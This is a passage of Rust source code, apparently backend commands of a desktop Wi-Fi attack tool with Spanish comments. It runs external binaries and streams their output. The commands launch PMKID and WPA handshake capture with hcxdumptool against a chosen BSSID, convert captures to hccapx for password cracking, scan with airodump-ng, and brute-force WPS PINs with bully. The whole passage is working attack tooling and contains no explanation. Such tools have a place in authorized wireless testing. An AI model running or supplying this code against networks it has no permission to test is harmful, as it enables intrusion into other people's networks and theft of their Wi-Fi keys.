    let (mut rx, child) = match shell.command(exe).args(&arg_refs).spawn() {
        Ok(result) => result,
        Err(e) => return CmdResponse {
            success: false, output: String::new(),
            stderr: e.to_string(), exit_code: None,
        },
    };
    {
        let mut map = state.running_attacks.lock().unwrap();
        map.insert(attack_id.to_string(), child);
    }
    let mut stdout = String::new();
    let mut stderr = String::new();
    let mut exit_code = None;
    while let Some(event) = rx.recv().await {
        match event {
            CommandEvent::Stdout(data) => {
                let txt = String::from_utf8_lossy(&data);
                stdout.push_str(&txt);
                // Emit progress event
                let _ = app.emit("attack-progress", serde_json::json!({
                    "id": attack_id,
                    "type": "stdout",
                    "data": txt.to_string()
                }));
            }
            CommandEvent::Stderr(data) => {
                let txt = String::from_utf8_lossy(&data);
                stderr.push_str(&txt);
                let _ = app.emit("attack-progress", serde_json::json!({
                    "id": attack_id,
                    "type": "stderr",
                    "data": txt.to_string()
                }));
            }
            CommandEvent::Terminated(status) => { exit_code = status.code; break; }
            CommandEvent::Error(err) => {
                stderr.push_str(&format!("Error: {}", err));
                let _ = app.emit("attack-error", serde_json::json!({
                    "id": attack_id,
                    "error": err.to_string()
                }));
                break;
            }
            _ => {}
        }
    }
    {
        let mut map = state.running_attacks.lock().unwrap();
        map.remove(attack_id);
    }
    let success = exit_code == Some(0);
    // Emit final event
    let _ = app.emit("attack-completed", serde_json::json!({
        "id": attack_id,
        "success": success,
        "stdout": stdout.clone(),
        "stderr": stderr.clone(),
        "exit_code": exit_code
    }));
    CmdResponse { success, output: stdout, stderr, exit_code }
}

/// Cancelar un ataque en background por su ID
#[command]
pub async fn cancel_attack(state: State<'_, AppState>, attack_id: String) -> Result<CmdResponse, String> {
    let mut map = state.running_attacks.lock().unwrap();
    if let Some(child) = map.remove(&attack_id) {
        let _ = child.kill();
        Ok(CmdResponse {
            success: true,
            output: format!("Ataque '{}' cancelado.", attack_id),
            stderr: String::new(),
            exit_code: Some(-1),
        })
    } else {
        Ok(CmdResponse {
            success: false,
            output: format!("No se encontró ataque activo con ID '{}'", attack_id),
            stderr: String::new(),
            exit_code: None,
        })
    }
}


/// PMKID Capture en background
#[command]
pub async fn pmkid_capture_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, channel: Option<u8>, duration_seconds: Option<u64>) -> Result<CmdResponse, String> {
    let attack_id = format!("pmkid_{}", bssid.replace(':', ""));
    let prog = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let ch = channel.unwrap_or(1);
    let dur = duration_seconds.unwrap_or(120);
    let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(), "-t".into(), dur.to_string(),
        "-w".into(), outfile.clone(), "--bssid".into(), bssid.clone(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let body = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
    Ok(CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture BG · {} · Canal={} · {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// Handshake Capture en background
#[command]
pub async fn capture_handshake_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, essid: Option<String>, channel: Option<u8>, duration_seconds: Option<u64>) -> Result<CmdResponse, String> {
    let attack_id = format!("handshake_{}", bssid.replace(':', ""));
    let dur = duration_seconds.unwrap_or(60);
    let ch = channel.unwrap_or(1);
    let bssid_clean = bssid.replace(':', "");
    let pcap = format!("handshake_{}.pcapng", bssid_clean);
    let hccapx = format!("handshake_{}.hccapx", bssid_clean);
    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(), "-t".into(), dur.to_string(),
        "-w".into(), pcap.clone(), "--bssid".into(), bssid.clone(),
        "--channel".into(), ch.to_string(),
    ];
    if let Some(ref e) = essid { args.push("--essid".into()); args.push(e.clone()); }
    let prog = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let cap = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let conv = if cap.success {
        let prog2 = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
        let c_args = vec!["-k".into(), "-o".into(), hccapx.clone(), pcap.clone()];
        run_bin(&app, prog2.to_str().unwrap_or("hcxpcapngtool.exe"), &c_args).await
    } else { CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code } };
    let ok = conv.success;
    let body = format!("Paso 1 — Captura:\n{}\n\nPaso 2 — Extracción EAPOL:\n{}\nArchivo: {}", cap.output, conv.output, hccapx);
    Ok(CmdResponse { success: ok, output: wrap(&format!("Handshake Capture BG · {} · Canal={} · {}s", bssid, ch, dur), &body, ok), stderr: format!("{}\n{}", cap.stderr, conv.stderr), exit_code: conv.exit_code })
}

/// Scan Airodump en background
#[command]
pub async fn scan_airodump_bg(app: AppHandle, state: State<'_, AppState>, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> Result<CmdResponse, String> {
    let attack_id = "airodump_scan".to_string();
    let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
    let ch = channel_filter.unwrap_or(0);
    let dur = duration_secs.unwrap_or(60);
    let mut args = vec!["--write-interval".into(), "1000".into(), "--output-format".into(), "csv".into()];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
    if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
    args.push("wlan0mon".into());
    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
    let body = format!("Binario: {}\nCanal: {}  Duración: {}s\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, r.output);
    Ok(CmdResponse { success: r.success, output: wrap("AIRODUMP Scan BG", &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
}

/// WPS PIN Bruteforce en background
#[command]
pub async fn wps_pin_bruteforce_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, interface: String) -> Result<CmdResponse, String> {
    let attack_id = format!("wps_{}", bssid.replace(':', ""));
    let prog = tool_path("BULLY_PATH", "bully.exe");
    let args = vec!["-b".into(), bssid.clone(), interface.clone()];
    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("bully.exe"), &args).await;
    let summary = if r.output.to_lowercase().contains("pin:") {
        format!("PIN encontrado:\n{}", r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect::<Vec<_>>().join("\n"))
    } else { "bully ejecutado en background.".into() };
    Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS Bruteforce BG · {} · {}", bssid, interface), &summary, r.success), stderr: r.stderr, exit_code: r.exit_code })
}


